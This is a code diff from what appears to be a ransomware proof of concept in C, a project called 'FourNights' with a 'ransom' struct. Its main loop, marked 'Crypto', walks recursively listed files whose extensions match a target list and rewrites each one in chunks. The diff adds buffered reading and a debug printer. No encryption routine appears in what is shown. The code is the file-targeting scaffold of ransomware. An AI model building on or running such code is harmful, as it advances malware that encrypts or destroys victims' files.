@@ -1,5 +1,18 @@
 #include "fournights.h"
 /**
+  * debug_list - prints elements of the target_file_buf struct
+  * @target_file_buf: lala
+  */
+void debug_list(target_file_t *target_file_buf)
+{
+	printf("\n\nDEBUG\n");
+	printf("--------%s--------\n", target_file_buf->filepath);
+	printf("bytes_read: %d\n", (int)target_file_buf->bytes_read);
+	printf("file_offset: %d\n", (int)target_file_buf->file_offset);
+	printf("st_size: %d\n", (int)target_file_buf->file_info.st_size);
+	getchar();
+}
+/**
   * print_for_debug - prints elements of the struct for debugging
   * @ransom: pointer to the ransom struct
   */
@@ -117,12 +130,13 @@ node_t *recurse_ls(char *dirname, ransom_t *ransom)
  **/
 int main(int ac, char *av[])
 {
-	char *buffer;
+	ssize_t bytes_read;
 	char *default_dir = "/home/vagrant/FourNights/TESTS/";
 	char *file_exts = "/home/vagrant/FourNights/c_poc/file_exts.txt";
 	node_t *walk;
 	struct ransom_s ransom;
 	struct utsname sys_info;
+	target_file_t *target_file;
 
 	ransom.root_path = NULL;
 	ransom.file_ext_nontoken = NULL;
@@ -130,6 +144,16 @@ int main(int ac, char *av[])
 	ransom.num_of_file_ext = 0;
 	ransom.os_info = sys_info;
 	ransom.target_files = NULL;
+
+	target_file = malloc(sizeof(target_file_t));
+	ransom.target_file_buf = target_file;
+
+/* build target_file_s part of ransom struct */
+	ransom.target_file_buf->filepath = my_calloc(BUFSIZE, sizeof(char));
+	ransom.target_file_buf->buf = my_calloc((BUFSIZE * 4) * sizeof(char), sizeof(char));
+	ransom.target_file_buf->file_offset = 0;
+	ransom.target_file_buf->bytes_read = 0;
+
 	/* handle signals */
 	signal(SIGINT, sighandler);
 	/* Start building struct */
@@ -137,31 +161,40 @@ int main(int ac, char *av[])
 	if (uname(&sys_info) == -1)
 		perror("uname error:");
 	ransom.os_info = sys_info;
-	if(!(buffer = read_file(file_exts, &ransom, tokenizer)))
-		perror("read error: ");
-	ransom.target_files = NULL;
+	if((bytes_read = read_file(file_exts, &ransom, tokenizer)) < 1)
+		fprintf(stderr, "File was empty\n");
 	recurse_ls(ransom.root_path, &ransom);
 	/* Struct Built. */
 
 	/* Crypto */
+	ransom.target_file_buf->file_offset = 0;
+	ransom.target_file_buf->bytes_read = 0;
 	walk = ransom.target_files;
 	while(walk)
 	{
 		printf("--------%s--------\n", walk->str);
-		buffer = read_file(walk->str, &ransom, NULL);
-		if(buffer)
+		my_strncat(ransom.target_file_buf->filepath, walk->str, 0, my_strlen(walk->str));
+		do
 		{
-printf("%d\n", (int) my_strlen(buffer));
-			write_file(walk, buffer);
+			/** DEBUGGING **/
+			debug_list(ransom.target_file_buf);
+
+			bytes_read = ransom.target_file_buf->bytes_read = read_file(walk->str, &ransom, write_file);
 		}
+		while(ransom.target_file_buf->file_offset < ransom.target_file_buf->file_info.st_size);
+
+		ransom.target_file_buf->file_offset = 0;
+		ransom.target_file_buf->bytes_read = 0;
 		walk = walk->next;
-		free(buffer);
 	}
 	/* print struct for debugging*/
 	/*
 	print_for_debug(ransom);
 	*/
-	/* Free */
+	print_list(ransom.target_files);
 	free_ransom_struct(&ransom);
+	free(target_file->buf);
+	free(target_file->filepath);
+	free(target_file);
 	return (EXIT_SUCCESS);
 }
